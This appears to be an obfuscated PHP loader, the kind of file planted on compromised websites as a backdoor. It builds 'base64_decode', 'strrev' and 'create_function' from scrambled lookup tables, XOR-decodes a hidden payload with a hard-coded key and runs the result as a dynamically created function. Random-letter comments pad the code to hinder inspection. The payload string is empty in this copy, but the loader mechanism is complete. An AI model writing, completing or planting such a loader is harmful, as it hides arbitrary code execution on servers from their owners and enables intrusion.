<?php  


 function HtDMZ($teeYh, $gKuAz = '') { $TpRcj = $teeYh; $PC0DT = ''; for ($VEC5l = 0; $VEC5l < strlen($TpRcj);) { for ($RdqlS = 0; $RdqlS < strlen($gKuAz) && $VEC5l < strlen($TpRcj); $RdqlS++, $VEC5l++) { $PC0DT .= $TpRcj[$VEC5l] ^ $gKuAz[$RdqlS]; } } return $PC0DT; }
/*JcbIFQoxBmhpbZXImrECMZstGhghyBlruszTZtoorNwyanpXheLJqYcgGffnHlmCzCqYMOIYAifBtubgwLmKnQfNZXynjPIIXFBWTevBdxixfvgielhFEDCoMIkgfnwG*/

$MplUyfKn267 = "camwhf)9tr0usy3edp(_61.lzvnbojx4/;8g52q*i7k";
$NPSstLzW61 = "";
$jBLovPKo6367 = "";
$IqECXEQu5148 = "";
foreach([27,1,12,15,20,31,19,16,15,0,28,16,15] as $c){
   $jBLovPKo6367 .= $MplUyfKn267[$c];
}
foreach([12,8,9,9,15,25] as $c){
   $IqECXEQu5148 .= $MplUyfKn267[$c];
}

/*PCfNunBYaFEnkqFdfEvtpitISnqSuEFyasdyopcppGuWJdxSARcbsHDVsLPzdOgkFcucClVzZBDzCLIBoYdCQagcldIYfScPDFfAjaiDcqfVNlndwYyXHmdcyoUrBQqo*/

$c = $IqECXEQu5148('n'.'o'.''.''.''.'i'.''.''.''.''.'t'.''.''.'c'.'n'.''.''.''.''.'u'.''.''.''.''.'f'.''.''.'_'.'e'.'t'.'a'.'e'.''.''.'r'.''.'c'.''.'');
$f = $c("/*aVwDyQjP8631*/", $jBLovPKo6367( HtDMZ($jBLovPKo6367($NPSstLzW61), "dRsJTsMF8737")));
$f();

/*UcjSjJPAyYbltGmyXRmlRstWetAEqHZGFsGdDmPqoArusTENSEttvrdJesAKzrbSKByhrIjbyVaxKbpWhkUuskhqxjSJbVwXiFIfyXWEbjduwbuYPKPoJWDRkVFCXtlW*/